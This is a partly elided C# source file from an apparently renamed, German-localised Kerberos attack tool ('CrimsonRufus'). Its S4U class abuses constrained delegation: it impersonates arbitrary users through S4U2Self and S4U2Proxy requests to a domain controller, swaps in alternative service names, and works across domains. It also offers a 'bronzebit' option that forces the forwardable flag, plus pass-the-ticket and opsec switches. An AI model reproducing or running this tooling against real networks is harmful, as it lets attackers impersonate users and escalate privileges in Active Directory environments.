...
namespace CrimsonRufus
{
    public class S4U
    {
        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool show = false)
        {
            ...
            if (kirbiBytes == null)
            {
                Console.WriteLine("[X] Fehler beim Abrufen eines TGT mit den angegebenen Parametern");
                return;
            }
            else
            {
        ...
        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool show = false)
        {
            ...
            if (!String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))
            {
                ...
                Console.WriteLine("[*] Führe domänenübergreifende eingeschränkte Delegierung durch");
            ...
            else
            {
                ...
                {
                    Console.WriteLine("[*] TGS für {0}\\{1} geladen", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
                ...
                else
                {
                    ...
                    else
                    {
                        ...
                        if (self == null)
                        {
                            Console.WriteLine("[X] S4U2Self fehlgeschlagen, kann S4U2Proxy nicht durchführen.");
                            return;
                        }
                    }
        ...
        {
            Console.WriteLine("[*] Imitiere Benutzer '{0}' für Ziel-SPN '{1}'", targetUser, targetSPN);
            if (!String.IsNullOrEmpty(altService))
            {
                string[] altSnames = altService.Split(',');
                if (altSnames.Length == 1)
                {
                    Console.WriteLine("[*]   Finales Ticket wird für den alternativen Dienst '{0}' erstellt", altService);
                }
                else
                {
                    Console.WriteLine("[*]   Finale Tickets werden für die alternativen Dienste '{0}' erstellt", altService);
                }
            }
            ...
            Console.WriteLine("[*] Erstelle S4U2proxy-Anfrage für Dienst: '{0}'", targetSPN);
            ...
            if (String.IsNullOrEmpty(proxyUrl))
            {
                ...
                Console.WriteLine("[*] Sende S4U2proxy-Anfrage an Domänencontroller {0}:88", dcIP);

                response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
            }
            else
            {
                Console.WriteLine("[*] Sende S4U2proxy-Anfrage über KDC-Proxy: {0}", proxyUrl);
            ...
            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                ...
                if (!String.IsNullOrEmpty(altService))
                {
                    ...
                    foreach (string altSname in altSnames)
                    {
                        ...
                        Console.WriteLine("[*] Ersetze alternativen Dienstnamen '{0}'", altSname);
                        ...
                        Console.WriteLine("[*] base64(ticket.kirbi) für SPN '{0}/{1}':\r\n", altSname, serverName);
                ...
                else
                {
                    ...
                    Console.WriteLine("[*] base64(ticket.kirbi) für SPN '{0}':\r\n", targetSPN);
        ...
        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null, string createnetonly = null, bool show = false)
        {
            ...
            Console.WriteLine("[*] Erstelle S4U2self-Anfrage für: '{0}@{1}'", userName, domain);
            ...
            if (String.IsNullOrEmpty(proxyUrl))
            {
                ...
                Console.WriteLine("[*] Sende S4U2self-Anfrage an {0}:88", dcIP);
                response = Networking.SendBytes(dcIP, 88, tgsBytes);
            }
            else
            {
                Console.WriteLine("[*] Sende S4U2self-Anfrage über KDC-Proxy: {0}", proxyUrl);
            ...
            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2self erfolgreich!");
                ...
                {
                    Console.WriteLine("[*] Bronze Bit Flag übergeben, setze forwardable-Flag. Ursprüngliche Flags: {0}", info.flags);
                ...
                Console.WriteLine("[*] TGS für '{0}' zu '{1}@{2}' erhalten", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
        ...
        private static void CrossDomainS4U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "", string createnetonly = null, bool show = false)
        {
            ...
            Console.WriteLine("[*] Rufe Referral-TGT von {0} für fremde Domäne {1}, KRBTGT-Dienst ab", domain, targetDomain);
            ...
            Console.WriteLine("[*] Rufe S4U2Self-Referral von {0} ab", targetDomain);
            ...
            Console.WriteLine("[*] Fordere S4U2Self-Ticket von {0} an", domain);
        ...
        private static KRB_CRED CrossDomainS4U2Self(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, string altService = "", bool self = false, string requestDomain = "", bool ptt = false, string createnetonly = null, bool show = false)
        {
            ...
            Console.WriteLine("[*] Fordere domänenübergreifendes 'S4U2Self' für {0} von {1} an", targetUser, targetDomainController);
            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, targetUser, ticket, clientKey, etype, requestEType, cross, requestDomain);

            Console.WriteLine("[*] Sende domänenübergreifende S4U2Self-Anfrage");
            ...
            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] Domänenübergreifendes S4U2Self erfolgreich!");
        ...
        private static KRB_CRED CrossDomainS4U2Proxy(string userName, string targetUser, string targetSPN, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, Ticket tgs = null, bool cross = true, bool ptt = false, string createnetonly = null, bool show = false)
        {
            ...
            Console.WriteLine("[*] Erstelle S4U2proxy-Anfrage für Dienst: '{0}' auf {1}", targetSPN, targetDomainController);
            ...
            Console.WriteLine("[*] Sende S4U2proxy-Anfrage");
